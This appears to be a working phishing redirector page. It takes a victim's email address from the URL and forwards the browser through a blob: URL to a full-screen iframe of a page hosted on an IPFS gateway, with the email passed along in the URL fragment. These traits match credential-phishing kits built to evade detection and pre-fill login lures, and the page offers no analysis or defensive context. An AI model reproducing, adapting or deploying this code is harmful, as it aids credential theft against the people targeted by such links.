<!DOCTYPE html>
<html>
<head>
    <title>Blob IPFS Redirect</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
</head>
<body style="margin:0; padding:0;">

<script>
// Base IPFS URL
const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";

// Get email parameter from ?email=
function getEmail() {
    const params = new URLSearchParams(location.search);
    return params.get("email") || "";
}

// Build final IPFS URL with #email hash
function buildIPFS(email) {
    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
}

// Create Blob HTML
function createBlobHTML(url) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
            <style>
                html, body {
                    margin:0;
                    padding:0;
                    width:100%;
                    height:100%;
                    overflow:hidden;
                    background:#fff;
                }
                iframe {
                    position:fixed;
                    top:0;
                    left:0;
                    width:100%;
                    height:100%;
                    border:none;
                }
            </style>
        </head>
        <body>
            <iframe src="${url}"></iframe>
        </body>
        </html>
    `;
}

// MAIN
document.addEventListener("DOMContentLoaded", () => {
    const email = getEmail();
    const ipfsURL = buildIPFS(email);

    const blobHTML = createBlobHTML(ipfsURL);

    const blob = new Blob([blobHTML], { type: "text/html" });
    const blobURL = URL.createObjectURL(blob);

    // Mobile-safe: use location.href instead of iframe injection
    window.location.href = blobURL;
});
</script>

</body>
</html>
